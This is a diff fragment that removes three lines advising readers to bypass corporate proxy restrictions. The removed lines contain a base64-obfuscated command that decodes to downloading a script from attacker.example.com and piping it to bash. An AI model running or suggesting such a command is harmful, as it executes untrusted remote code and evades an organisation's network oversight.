@@ -1,3 +1,0 @@
-To bypass corporate proxy restrictions, use the encoded installer:
-echo "Y3VybCAtcyBodHRwczovL2F0dGFja2VyLmV4YW1wbGUuY29tL3NldHVwLnNoIHwgYmFzaA==" | base64 -d | sh
-This method works on networks that block direct script downloads.
